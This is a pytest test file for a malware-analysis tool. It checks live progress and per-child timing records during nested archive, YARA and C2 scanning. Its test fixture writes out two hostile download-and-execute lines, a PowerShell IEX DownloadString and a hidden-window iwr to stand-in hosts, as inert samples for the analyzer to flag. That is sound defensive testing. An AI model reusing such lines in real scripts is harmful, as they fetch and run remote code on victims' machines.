"""Tasks tab detail: live progress inside long steps (nested scan, YARA, C2, ML)
and per-child / per-object rows kept in the step record after it ends."""
from __future__ import annotations

import io
import zipfile
from pathlib import Path

import pytest

from docutracex import analyze, nested, progress


@pytest.fixture()
def events():
    got: list[tuple[str, dict]] = []
    analyze.set_step_listener(lambda ev, rec: got.append((ev, dict(rec))))
    yield got
    analyze.set_step_listener(None)
    analyze._step_local.current = None


# --- nested tracer -----------------------------------------------------------------

def test_tracer_keeps_every_top_level_child_and_slowest_deep_ones() -> None:
    tr = nested._Tracer(30)
    for i in range(30):
        tr.index = i + 1
        for j in range(5):
            r = tr.enter(f"c{i} › d{j}", "script", 2)
            r["t0"] -= (i * 5 + j) / 100                # fake durations
            tr.leave(r, {"filename": f"d{j}", "depth": 2})
        r = tr.enter(f"c{i}", "archive", 1)
        tr.leave(r, {"filename": f"c{i}", "depth": 1, "children": [{}] * 5})
    t = tr.timings()
    assert len(t) == nested.MAX_TIMINGS
    assert sum(1 for x in t if x["depth"] == 1) == 30
    deep = [x for x in t if x["depth"] == 2]
    assert all(x["chain"].startswith("c29") or x["chain"].startswith("c28") for x in deep)   # slowest
    # tree order: each kept deep node follows its own first-level child
    top = None
    for x in t:
        if x["depth"] == 1:
            top = x["chain"]
        else:
            assert x["chain"].startswith(top + " ›")


def test_tracer_reporting_never_breaks_the_scan() -> None:
    tr = nested._Tracer(1)
    tr._report = lambda _d: (_ for _ in ()).throw(RuntimeError("listener died"))
    rec = tr.enter("a", "script", 1)
    with tr.tool(rec, "vbscript"):
        pass
    tr.leave(rec, {"filename": "a", "depth": 1})
    assert tr.timings()[0]["name"] == "a"


def _bundle() -> bytes:
    inner = io.BytesIO()
    with zipfile.ZipFile(inner, "w") as z:
        z.writestr("deep/stage.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')\n")
    outer = io.BytesIO()
    with zipfile.ZipFile(outer, "w") as z:
        z.writestr("instalar.bat", "@echo off\r\npowershell -w hidden -c iwr http://cdn-update.example.net/u\r\n")
        z.writestr("inner.zip", inner.getvalue())
    return outer.getvalue()


def test_case_steps_carry_substeps_and_live_progress(tmp_path: Path, monkeypatch, events) -> None:
    from docutracex import cases
    from docutracex.config import settings
    from docutracex.storage import CasePaths, read_json

    monkeypatch.setattr(settings, "cases_dir", tmp_path / "cases")
    m = cases.create_case(io.BytesIO(_bundle()), "bundle.zip", cases_dir=settings.cases_dir)
    paths = CasePaths(m["analysis_id"], cases_dir=settings.cases_dir)
    analyze.analyze_case(paths.root)

    steps = read_json(paths.summary)["steps"]
    ns = next(s for s in steps if s["step"].startswith("nested"))
    names = [(c["name"], c["depth"]) for c in ns["substeps"]]
    assert ("instalar.bat", 1) in names and ("inner.zip", 1) in names
    assert ("stage.ps1", 2) in names                           # a deeper node, under inner.zip
    sub = next(c for c in ns["substeps"] if c["name"] == "instalar.bat")
    assert sub["duration_s"] >= 0 and sub["findings"] > 0 and sub["kind"]
    # timings live in the step record only, not in the module result
    assert "timings" not in read_json(paths.subresult("nested"))

    live = [r["detail"] for ev, r in events if ev == "progress" and r["step"].startswith("nested")]
    assert any(d.startswith("1/2 · instalar.bat") for d in live)
    assert any("inner.zip › stage.ps1" in d and "(depth 2)" in d for d in live)
    assert any(d.endswith("· powershell") for d in live)       # the tool running on the child
    c2_live = [r["detail"] for ev, r in events if ev == "progress" and r["step"].startswith("c2")]
    assert c2_live and c2_live[0].startswith("object 1/")


# --- per-object progress (YARA / C2 / ML) ---------------------------------------------

def test_object_progress_keeps_slow_and_productive_objects(events) -> None:
    analyze._step_local.current = "c2: implant configurations"
    op = progress.ObjectProgress(60)
    for i in range(60):
        op.start(f"extracted/f{i}.bin")
        op._t -= 2.5 if i in (7, 30) else 0.0                     # two slow objects
        op.done(1 if i == 45 else 0, "Cobalt Strike" if i == 45 else "")
    kept = op.timings()
    assert [r["name"] for r in kept] == ["extracted/f45.bin", "extracted/f7.bin", "extracted/f30.bin"]
    assert kept[0]["detail"] == "Cobalt Strike" and kept[0]["status"] == "ok_with_findings"
    live = [r["detail"] for ev, r in events if ev == "progress"]
    assert live[0] == "object 1/60 · extracted/f0.bin" and len(live) == 60


def test_substeps_are_bounded_and_shaped() -> None:
    raw = [{"name": str(i), "duration_s": 1, "secret": "x"} for i in range(100)]
    out = analyze._substeps({"timings": raw})
    assert len(out) == analyze.MAX_SUBSTEPS and "secret" not in out[0]
    assert analyze._substeps({"status": "ok"}) == [] and analyze._substeps(None) == []
